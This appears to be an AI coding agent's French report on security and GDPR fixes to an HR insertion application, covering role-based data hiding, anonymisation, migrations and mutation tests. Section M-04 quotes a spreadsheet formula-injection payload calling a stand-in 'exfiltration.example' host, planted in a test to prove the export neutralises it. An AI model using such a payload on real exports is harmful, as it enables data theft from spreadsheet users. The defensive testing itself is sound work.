# PR A « Conformité immédiate » — correctifs de sécurité et de conformité RGPD

> **Agent « correctifs de sécurité »** — chantier `cip-refonte-2026-09-12`, branche
> `claude/solidata-cip-redesign-9fskwq`. Applique la **liste ordonnée du § 6** de
> `12-revue-securite-PR-A.md`, points **1 à 15** (le point 16, l'AIPD, est hors code).
> **Date** : 13 septembre 2026.

---

## 0. Verdict

**Les 15 points de code sont traités.** 3 bloquants, 6 majeurs, 6 mineurs.

| Preuve | Résultat |
|---|---|
| `cd backend && npx jest --silent` | **225 suites / 4 412 tests verts, 0 échec** (+27 vs avant correctifs) |
| `PR_A_E2E_DB=1 npx jest tests/e2e-pr-a` (PostgreSQL réel) | **4 suites / 93 tests verts** (+12) |
| Migrations sur base RÉELLE déjà migrée | **17 vérifications vertes, 0 rouge** — M-05 d'abord **reproduit** (23514) puis corrigé |
| `cd frontend && npx vite build` | vert |
| Contre-épreuves par mutation | **9**, toutes restaurées (§ 4) |

**Ce qui reste à la direction et au DPO** : l'arbitrage M-06 à confirmer (§ 3), et l'AIPD (§ 5).

**Ce qui a changé de nature dans les tests** : les trois suites de reproduction de la revue
(`backend/tests/securite-pr-a/`) étaient **vertes parce que le défaut était là**. Elles sont
**retournées** : même mise en scène, mêmes jeux de données, mêmes routes — l'attente a changé de
sens. Elles échouent donc si la fuite revient. La contre-épreuve par mutation (§ 4) le démontre pour
chacune.

---

## 1. Constats BLOQUANTS

### C-01 — Les critères d'éligibilité IAE ne sont plus servis au MANAGER

**Fichiers** : `backend/src/routes/insertion/cadre.js:380` (`projeterPourManager`), `:253`
(`composerCadre`), `:168` (`lireCriteres`).

**Ce qui a changé.** `projeterPourManager` retirait `statuts`, `pieces` et le bloc de report — et
laissait passer `eligibilite.criteres` intact, avec ses codes ET ses libellés. Or les 14 critères du
référentiel portent « Bénéficiaire du RSA » (le statut que la clé `statuts` protège), « Reconnaissance
RQTH » et « Allocataire AAH » (art. 9) et « Sortant de détention » (art. 10). La projection est
refaite : l'encadrant reçoit `{ verifiee_le, source, nb_criteres }` — **ce qui suffit à la pièce du
dossier de conformité qu'il consulte légitimement** (« l'éligibilité a-t-elle été vérifiée ? ») sans
rien dire de quoi elle est faite. La référence libre des justificatifs (`justificatifs_ref`) part avec.

Deux garde-fous plutôt qu'un, et c'est délibéré : `composerCadre` accepte désormais `{ adminRh }` et
**ne LIT pas** ce que l'encadrant n'a pas le droit de voir (colonnes de statut social retirées du
`SELECT`, `lirePieces` non appelée, RQTH non interrogée — c'est aussi le correctif **m-10**), et la
projection reste appliquée derrière. Un futur appelant qui oublierait le drapeau est encore couvert.

**Preuve** : `tests/contract/insertion-cadre-contract.test.js` — les deux assertions qui
**verrouillaient la fuite** (l. 125 `expect(...criteres).toHaveLength(2)` et le test « aucune donnée
sensible servie ») sont inversées ; 4 tests ajoutés, dont « pour un MANAGER, ni les pièces ni les
statuts ne sont LUS en base ». Sur base réelle : `tests/e2e-pr-a/pr-a-cadre-e2e.test.js`, test
« C-01 — le MANAGER ne reçoit ni code ni libellé de critère, seulement un compte » — **c'est la
vérification demandée par le rapport de debug 13 § 7.2**, posée sur des lignes réellement écrites.

**Test qui le verrouille** : `securite-pr-a/manager-statuts-sociaux.test.js` § C-01 (3 tests) +
`contract/insertion-cadre-contract` (4) + `e2e-pr-a/pr-a-cadre-e2e` (1).

---

### C-02 — `suggestions_fse` ne lit plus `employees.brsa` pour un MANAGER

**Fichier** : `backend/src/routes/insertion/routes.js:340-341` (`enrichirFse`), appelée en `:198` et
`:443`.

**Ce qui a changé.** La fonction exécutait `SELECT brsa, france_travail_id FROM employees` **après**
le masquage de la ligne de diagnostic, et `suggestionsEntree` en composait une phrase lisible
(« Dossier administratif : bénéficiaire du RSA »). Le masquage par champ ne pouvait rien : il agit
sur la ligne `insertion_diagnostics`, la fuite venait d'une **seconde requête, postérieure, sur une
autre table**.

On ne filtre pas la sortie du moteur de suggestions : **on ne l'alimente pas**. C'est le correctif
structurel de 2.43.0 appliqué ici — rien de dérivé ne peut fuir d'une donnée qui n'a pas été lue.
`baseRole` est propagé aux deux appels ; pour un MANAGER la fonction rend `{ suggestions_fse: {},
fse_completude: null }` **sans émettre la requête**.

**Preuve** : `securite-pr-a/manager-statuts-sociaux.test.js` § C-02 — l'assertion qui exigeait
`{ valeur: 'rsa', source: 'Dossier administratif : bénéficiaire du RSA' }` est inversée, et un test
dédié vérifie que **la requête n'est pas émise** (`lectures).toHaveLength(0)`). Sur base réelle :
`e2e-pr-a/pr-a-securite-e2e.test.js` § C-02/M-01.

---

### C-03 — L'alerte « référent non déterminé » ne nomme plus le statut BRSA

**Fichier** : `backend/src/routes/insertion/routes.js:1965-1966` (lecture) et `:2146` (alerte).

**Ce qui a changé.** Deux corrections, pas une. Le **texte** ne nomme plus le statut
(« Référent unique non déterminé — à signaler au Département. ») : ce qu'il faut faire se dit sans
énoncer « la personne est bénéficiaire du RSA » sur l'écran d'un salarié. Et l'**alerte n'est servie
qu'à ADMIN/RH** — ce sont eux qui saisissent le référent.

Surtout, le statut **n'est plus lu** : la route n'a pas d'`authorize` (elle hérite d'ADMIN/RH/MANAGER
et son bandeau s'affiche en tête de fiche pour tous les rôles), donc la colonne est remplacée par
`NULL::boolean AS brsa` dans le `SELECT` pour un encadrant. Fragment composé de littéraux, jamais
d'une entrée utilisateur.

**Preuve** : `securite-pr-a/manager-statuts-sociaux.test.js` § C-04 — assertion inversée, plus un test
de référence qui vérifie que l'ADMIN, lui, **reçoit toujours l'alerte** (on ne l'a pas supprimée, on
l'a reformulée et cloisonnée). Sur base réelle : `e2e-pr-a/pr-a-securite-e2e.test.js` § C-03.

---

## 2. Constats MAJEURS

### M-01 — Le questionnaire FSE+ d'entrée devient réellement ADMIN/RH strict

**Fichiers** : `backend/src/routes/insertion/masking.js:42-45`, `routes.js:380`,
`frontend/src/components/insertion/DiagnosticForm.jsx:233`.

`fse_entree`, `fse_entree_complet`, `fse_entree_saisie_at` — **et `fse_sortie`**, trouvé au passage :
`GET /milestones/:id` rend `im.*`, donc le questionnaire de sortie et son commentaire libre
partaient au MANAGER par la même porte — entrent dans `MANAGER_HIDDEN_FIELDS`. Le masquage **retire**
les clés : l'absence dit « non habilité », pas « non renseigné ».

En écriture, le refus est **explicite (403 `FSE_ADMIN_RH_STRICT`)** et non un retrait silencieux,
contrairement aux autres champs masqués : c'est une pièce d'audit européenne, et un enregistrement
qui « passe » sans rien écrire ferait croire à la personne qui l'a saisi qu'il est en base.

Côté écran, l'étape « Données FSE+ (entrée) » **disparaît du stepper** pour l'encadrement (les index
se recalent, rien n'est grisé — une rubrique grisée dirait qu'il y a quelque chose à voir).

**Preuve** : `securite-pr-a/manager-statuts-sociaux.test.js` (lecture, assertion inversée),
`securite-pr-a/correctifs-complementaires.test.js` § M-01 (écriture refusée, **aucun INSERT**, et
non-régression : les autres champs restent écrivables), `e2e-pr-a/pr-a-securite-e2e.test.js` (le
JSONB en base est **identique avant et après** la tentative du MANAGER).

---

### M-02 — La clôture d'un bilan de sortie est réservée à ADMIN/RH

**Fichier** : `backend/src/routes/insertion/routes.js:842` (garde), `:1053` (projection), `:988`
(`detail` retiré) ; `frontend/src/components/insertion/EntretienForm.jsx:1021`.

La même écriture de `insertion_fse_sorties` — avec `saisie_par` et `saisie_at`, les deux champs sur
lesquels l'autorité calcule son délai de saisie — passait par deux portes d'habilitation différentes.
La garde est posée **dans le handler, après lecture du type de jalon**, et non sur la route : les
autres entretiens (bilans intermédiaires, période d'essai), que l'encadrement technique conduit
lui-même, restent clôturables par lui. L'écran suit : le bouton « Clôturer le bilan de sortie »
laisse place à une mention qui dit **ce qui est enregistré et ce qui ne l'est pas**.

`sortie_fse` est **projeté** (`id`, `date_sortie`, `situation_sortie`, `source`, `saisie_at`) au lieu
d'être renvoyé en entier — la ligne complète portait `fse_sortie` et son commentaire libre, hors
masquage. Le `detail: e.message` du 409 est retiré (**m-03**).

**Preuve** : `securite-pr-a/correctifs-complementaires.test.js` § M-02 (403, `ROLLBACK`, aucune
requête `insertion_fse_sorties`, jalon ni clôturé ni verrouillé, **et** un bilan intermédiaire qui
n'est PAS refusé en 403) ; sur base réelle, `e2e-pr-a/pr-a-securite-e2e.test.js` vérifie le **compte
de lignes** avant/après et l'état du jalon en base.

---

### M-03 — Le commentaire libre des questionnaires FSE+ est retiré à l'anonymisation

**Fichier** : `backend/src/services/anonymization.js:485-505` ; registre :
`backend/src/scripts/migrations/insertion-fse.js` § (h).

Des trois remèdes proposés par la revue, la **purge** a été retenue (le premier de son ordre de
préférence) : la moins coûteuse, et suffisante. Chiffrer aurait ajouté une clé dans un JSONB destiné
à être relu par un contrôleur cinq ans plus tard ; retirer l'item aurait été plus radical que
nécessaire, la CIP disposant déjà de son journal de suivi chiffré (2.47.0).

Trois `UPDATE … SET <colonne> = <colonne> - 'commentaire'` (entrée, sortie, **et la copie historique
portée par le jalon**, trouvée au passage), chacun sous son propre SAVEPOINT. **Les réponses typées
restent** : ce sont elles, la piste d'audit. Le registre art. 30 est mis en accord : le commentaire
est **nommé** dans les catégories de données, avec son sort (« jamais exporté, retiré à
l'anonymisation »), et la durée de conservation porte l'exception.

**Preuve** : `securite-pr-a/commentaire-libre-retention.test.js` (assertions inversées : la purge est
exigée, et la **non-suppression des lignes** aussi — le correctif ne doit pas détruire la piste
d'audit) ; `unit/services/anonymization.test.js` § M-03 ; sur base réelle,
`e2e-pr-a/pr-a-securite-e2e.test.js` § M-03 écrit un commentaire (« Hospitalisation en psychiatrie…
sursis probatoire… »), anonymise, et relit : commentaire **absent**, `ressources_principales`,
`foyer_monoparental`, `type_contrat` et `situation_sortie` **intacts**, ligne de sortie **présente**.

---

### M-04 — Injection de formule neutralisée dans les deux exports (CSV **et** Excel)

**Fichiers** : nouveau module partagé `backend/src/utils/export-csv.js`,
consommé par `routes/exports-fse.js:97` et `routes/exports.js:6,440`.

La revue a trouvé **le même défaut dans deux fichiers** : deux fonctions d'échappement écrites
séparément et fausses de la même façon. Corriger deux copies laisse la porte ouverte à une
troisième : la règle vit désormais dans **un module pur**, testable sans monter une route.

Le guillemetage CSV est une convention de transport ; le tableur retire les guillemets **puis**
évalue. Une cellule commençant par `=`, `+`, `-`, `@`, TAB ou CR est préfixée d'une apostrophe, qui
ne s'affiche pas et force le mode texte. **Chaînes uniquement** : un délai de saisie négatif doit
rester un nombre, sans quoi la colonne que l'instructeur « regarde en premier » cesserait de se
trier. `addDataSheet` (ExcelJS) reçoit le même traitement : une chaîne commençant par `=` y est
écrite comme une **formule** quand la cellule est typée automatiquement, et le classeur est le format
**par défaut** de l'export Insertion.

**Preuve** : `securite-pr-a/export-csv-injection.test.js` — les trois assertions « part non
neutralisée » sont inversées, et 2 tests ajoutés (les nombres restent des nombres ; les six amorces
sont couvertes **et elles seules**). Sur base réelle : `e2e-pr-a/pr-a-securite-e2e.test.js` pose une
commune piégée `=HYPERLINK("http://exfiltration.example/?d="&A2&B2,…)` dans la fiche d'un salarié et
l'export réel la rend `"'=HYPERLINK(…)"`, contenu intact (on neutralise, on ne tronque pas).

---

### M-05 — Le CHECK `situation_6mois` est élargi sur une base déjà migrée

**Fichier** : `backend/src/scripts/migrations/insertion-fse.js:130-155`.

DO-scan de `pg_constraint` : on ne supprime que les contraintes portant sur cette colonne **et**
ignorant encore la valeur (donc rejouable sans effet), puis on repose la liste complète. L'ancienne
est un sous-ensemble strict de la nouvelle : aucune ligne existante ne peut être refusée.

**Preuve — le défaut est d'abord REPRODUIT sur PostgreSQL réel.** La base de recette a été remise
dans l'état d'une base migrée par la version fautive ; l'insertion d'`injoignable` échoue en
**23514**. Après exécution des migrations corrigées, la même insertion passe, et une valeur hors
liste reste refusée (le CHECK n'a pas été « corrigé » en le supprimant). Trois exécutions
supplémentaires : **une seule contrainte**, pas d'empilement.

---

### M-06 — `sortant_detention` (art. 10) — décision de l'orchestrateur, **à confirmer**

Voir § 3 : la décision, son implémentation et ce qui reste à trancher.

---

## 3. M-06 — le critère judiciaire : décision appliquée, à confirmer par la direction et le DPO

**La décision prise** (la plus sûre des deux options de la revue, et réversible) : le critère
**RESTE dans le référentiel** — il fonde une éligibilité IAE, le retirer ferait disparaître le motif
réel d'entrée en parcours de certaines personnes — mais il est **marqué art. 10** et, à ce titre :

1. **jamais dans la colonne 10 de l'export FSE+** ni dans aucun export nominatif ;
2. **jamais rendu à un MANAGER**, ni son libellé ni son **compte** (`nb_criteres` l'exclut : le
   compter reviendrait, sur un dossier n'ayant qu'un critère, à désigner lequel) ;
3. **jamais dans le bloc « Les Emplois de l'inclusion »**, qui se copie hors de l'outil — remplacé
   par « **[critère judiciaire — voir la fiche]** ». Une mention neutre, et non un blanc : sur un
   formulaire officiel, un blanc se lit comme un oubli de l'agent.

**Implémenté par une propriété du référentiel, jamais par un nom codé en dur** :

| Élément | Fichier:ligne |
|---|---|
| Colonne `sensible_art10 BOOLEAN NOT NULL DEFAULT false` | `migrations/insertion-cadre.js:94` |
| Seed (4ᵉ colonne de `CRITERES_ELIGIBILITE`) | `migrations/insertion-cadre.js:59-74` |
| Marquage initial des bases **déjà seedées**, sous verrou `insertion.eligibilite_art10_seed` | `:77`, `:112-135` |
| Filtre de la colonne 10 (en SQL, à la composition du fichier) | `routes/exports-fse.js:165` |
| Exclusion du compte servi au MANAGER | `routes/insertion/cadre.js:380` |
| Remplacement dans le bloc de report | `routes/insertion/cadre.js:107` |
| Administration (lecture 3 rôles, écriture ADMIN) | `routes/insertion/eligibilite.js` |
| Écran de réglages (colonne « Nature » + case à cocher argumentée) | `frontend/src/pages/AdminInsertion.jsx` |

Deux points méritent d'être dits franchement :

- **Sans le marquage initial, le correctif serait inopérant là où il compte.** `ON CONFLICT DO
  NOTHING` ne touche pas les lignes existantes : sur la recette et la production, « Sortant de
  détention » serait resté à `false`. Le marquage est donc explicite, joué **une fois**, puis
  verrouillé (doctrine 2.26.4) : **si la direction décoche la case demain, un redémarrage ne la
  recochera pas**.
- **L'arbitrage se change sans redéploiement.** C'est tout l'intérêt de la propriété : la direction
  et le DPO tranchent dans l'écran de réglages, pas dans le code.

**Ce qui reste à faire par la direction et le DPO** : *confirmer* ce choix. L'autorité n'a pas
discuté ce critère (elle a tranché la RQTH : « code d'éligibilité en colonne 10, jamais information
médicale »), mais sa règle commune est sans nuance — « exclusions absolues dans tout export qui sort
de la structure : […] frein judiciaire sous toute forme ». Si la direction préfère l'option (b) de la
revue (conserver le critère dans l'export pour la typologie annuelle), il suffit de décocher la case
**et** de reprendre l'entrée art. 30 en conséquence : en l'état, le registre écrit en base affirme
que le fichier ne contient **aucune donnée judiciaire**, ce qui est désormais vrai.

**Preuve** : `unit/scripts/insertion-cadre-migration.test.js` (4 tests : seul `sortant_detention`
marqué, colonne ajoutée séparément, marquage paramétré et verrouillé, registre repris en paramètres) ;
`contract/insertion-cadre-contract.test.js` (l'ADMIN voit le critère, le bloc de report ne le nomme
pas) ; sur base réelle, `e2e-pr-a/pr-a-securite-e2e.test.js` § M-06 (colonne 10 du **vrai** fichier)
et `pr-a-cadre-e2e.test.js` § M-06 (3 critères en base, 2 annoncés à l'encadrant) ; et la preuve de
migration (§ 0) : marquage sur base déjà seedée, **décochage ADMIN qui survit à deux redémarrages**.

---

## 4. Constats MINEURS

| # | Fichier:ligne | Ce qui a changé | Test qui le verrouille |
|---|---|---|---|
| **m-01** | `services/anonymization.js:456-466` | **Un SAVEPOINT par table** au lieu d'un seul partagé : une table absente (migration partielle) faisait annuler les deux purges voisines, qui auraient parfaitement abouti, et l'incident ne laissait qu'un `console.warn`. | `unit/services/anonymization.test.js` § m-01 (6 points de reprise nommés, l'ancien **absent**) |
| **m-02** | `routes/insertion/pieces.js:119` | La consultation d'une pièce signée laisse **deux traces** : registre RGPD **et** journal d'activité. L'écriture au registre est en « best effort » — son `catch` avale l'échec pour ne pas refuser un document —, le prix en était qu'une consultation pouvait ne laisser **aucune** trace, alors que l'autorité pose « consultation journalisée » en *condition*. Si les deux tombent, c'est dit fort au journal serveur. | `securite-pr-a/correctifs-complementaires.test.js` § m-02 (2 tests, dont registre en échec → la trace subsiste) |
| **m-03** | `routes/exports.js:634`, `routes/insertion/routes.js:988` | `detail: err.message` (message SQL brut) retiré des deux 500/409. Le `code` SQLSTATE reste : il rend l'erreur diagnosticable sans rien dire de la donnée. | `securite-pr-a/correctifs-complementaires.test.js` (garde statique, commentaires exclus) |
| **m-04** | `utils/export-csv.js:71`, `exports-fse.js:315` et `:456` | L'en-tête du fichier transmis à la DDETS porte **« Prénom Nom »** et non l'identifiant de connexion. `nomGenerateur` est partagé par les deux exports. | `contract/fse-plus-contract.test.js` (assertion inversée) + `e2e-pr-a/pr-a-securite-e2e` |
| **m-05** | `exports-fse.js:421` | Le drapeau unique `nominatif: false` était **faux** (le § 6 nomme les intervenants). Deux drapeaux distincts, tous deux vrais : `participants_nominatifs: false`, `intervenants_nominatifs: true`. | `contract/fse-plus-contract` + `e2e-pr-a/pr-a-exports-e2e` |
| **m-06** | `routes/insertion/pieces.js:200-225` | Une pièce ne peut plus être rattachée à l'entretien ou à la PMSMP **d'un autre salarié** : la FK ne contrôlait que l'existence. 400 `RATTACHEMENT_HORS_SALARIE`, posé **avant** l'insertion. Sur une pièce signée, c'est une erreur qu'on ne rattrape plus. | `securite-pr-a/correctifs-complementaires.test.js` § m-06 (2 tests) + `e2e-pr-a/pr-a-securite-e2e` (base réelle, la FK *accepterait*) |
| **m-07** | `frontend/.../DossierAdministratif.jsx:610` | `<DossierConformite>` n'est rendu qu'à ADMIN/RH : son API l'est, un MANAGER n'y voyait qu'un bandeau d'erreur 403. Ne rien montrer vaut mieux qu'annoncer une panne là où il n'y a qu'une habilitation. | build Vite ; pas de test frontend (le dépôt n'en a pas) |
| **m-08** | `frontend/.../EntretienForm.jsx:1111` | Texte d'aide sous « Référence de la pièce fournie » : « N'inscrivez aucune information médicale… ». Ce champ libre part tel quel dans la feuille Excel, alors que la liste fermée des motifs d'absence interdit précisément d'y nommer une nature médicale. | build Vite |
| **m-09** | `routes/exports.js:453-459`, `:630` | La garde de `toCsv` sur un jeu vide est rétablie (`EXPORT_VIDE`), et le handler la traduit en **409 motivé** au lieu d'un 500 « TypeError ». La fonction ne dépend plus de ses appelants. | `securite-pr-a/correctifs-complementaires.test.js` § m-09 |
| **m-10** | `routes/insertion/cadre.js:253` | Traité avec C-01 : `composerCadre` ne **lit** pas les pièces, les statuts ni la RQTH pour un encadrant — « un refus après lecture serait un refus d'affichage, pas d'accès » (doctrine 2.51.0). | `contract/insertion-cadre-contract` § m-10 |

---

## 5. Contre-épreuves par mutation

Chaque correctif a été **remis à l'état fautif**, la suite rejouée, puis le fichier restauré. Un test
qui ne tombe pas ne verrouille rien.

| Mutation | Suites rejouées | Résultat |
|---|---|---|
| **C-01** — la liste des critères revient dans la projection MANAGER | `securite-pr-a/manager-statuts-sociaux` + `contract/insertion-cadre-contract` | **2 échecs** / 51 |
| **C-02** — `enrichirFse` relit les statuts pour un MANAGER | `securite-pr-a/manager-statuts-sociaux` | **2 échecs** / 9 |
| **M-04** — la neutralisation de formule est retirée | `securite-pr-a/export-csv-injection` | **3 échecs** / 4 |
| **M-01** — l'écriture du questionnaire FSE+ redevient possible | `securite-pr-a/correctifs-complementaires` | **1 échec** / 11 |
| **M-02** — un MANAGER peut de nouveau clôturer un bilan de sortie | `securite-pr-a/correctifs-complementaires` | **1 échec** / 11 |
| **M-03** — le commentaire n'est plus retiré à l'anonymisation | `securite-pr-a/commentaire-libre-retention` + `unit/services/anonymization` | **2 échecs** / 28 |
| **M-06 (a)** — le critère judiciaire repart en colonne 10 | `e2e-pr-a/pr-a-securite-e2e` (**base réelle**) | **1 échec** / 10 |
| **M-06 (b)** — le bloc de report recopie de nouveau le critère | `e2e-pr-a/pr-a-cadre-e2e` + `contract/insertion-cadre-contract` | **3 échecs** / 72 |
| **m-02** — la consultation ne laisse plus qu'une trace | `securite-pr-a/correctifs-complementaires` | **2 échecs** / 11 |

**Un trou de couverture trouvé par ces mutations, et comblé.** La première tentative de mutation
M-06 (a) a été jouée contre `contract/fse-plus-contract` : **39 tests verts, aucun échec**. Le faux
`pg` de cette suite rend la colonne agrégée quoi qu'il arrive — il ne peut voir ni un JOIN ni un
prédicat. Le test a donc été déplacé vers la suite e2e, sur base réelle, avec deux critères
réellement constatés (dont un marqué art. 10) et une assertion sur la **cellule 10 du vrai fichier**.
La mutation tombe désormais.

---

## 6. Ce qui reste, et qui ne relève pas de ce lot

1. **M-06 — confirmer l'arbitrage** (direction + DPO). Le code applique la décision la plus
   protectrice et la rend réversible en une case à cocher (§ 3). Tant que la confirmation n'est pas
   rendue, le registre art. 30 et le code disent la même chose : c'est déjà mieux que l'état
   antérieur, où ils se contredisaient.
2. **AIPD** (point 16 du § 6 de la revue, hors code). À mettre à jour des deux nouveaux traitements
   en nommant : les critères d'éligibilité relevant des art. 9 et 10, le stockage des pièces signées
   en base, la conservation FSE+ ≥ 5 ans survivant à l'anonymisation, et **le sort du commentaire
   libre après correctif** (retiré à l'anonymisation — les réponses typées, elles, sont conservées).
   L'autorité pose l'AIPD validée par le DPO comme l'une des cinq lignes sur lesquelles elle n'a
   « aucune marge d'appréciation ».
3. **Réserve honnête sur les preuves d'écran.** Le dépôt n'a aucun test frontend (chantier T1.5 de
   l'audit) : les quatre changements d'interface (m-07, m-08, résumé d'éligibilité pour
   l'encadrement, case art. 10) sont couverts par le build Vite et par la lecture, **pas** par un
   rendu navigateur. Les gardes qui comptent sont côté serveur et sont, elles, éprouvées sur base
   réelle : l'écran ne fait que cesser de proposer ce que l'API refuse.
4. **Pour la démonstration annoncée par l'autorité** (`09` § 4.3 condition 3 — « connectez-vous
   devant moi avec un compte d'encadrant technique »), le comportement attendu est désormais : pas de
   volet statuts, pas de pièces, **pas de liste de critères** (un nombre et une date), pas de
   questionnaire FSE+, pas de dossier de conformité, et pas de bouton de clôture sur un bilan de
   sortie.

---

## 7. Rejouer ces preuves

```bash
# Suites complètes (sans base)
cd backend && npx jest --silent            # 225 suites / 4 412 tests

# Sur PostgreSQL réel
source <scratchpad>/db-test.env
cd backend && PR_A_E2E_DB=1 npx jest tests/e2e-pr-a   # 4 suites / 93 tests

# Migrations : défaut M-05 reproduit puis corrigé, marquage art. 10, registres,
# idempotence (3 passes), garde anti-écrasement du texte du DPO
source <scratchpad>/db-test.env && node <scratchpad>/preuve-migrations.js   # 17 vertes / 0 rouge

# Frontend
cd frontend && npx vite build
```

---

*Correctifs de sécurité — 15 points de code sur 15. Deux décisions restent à la direction et au DPO :
la confirmation de l'arbitrage M-06 et la mise à jour de l'AIPD.*
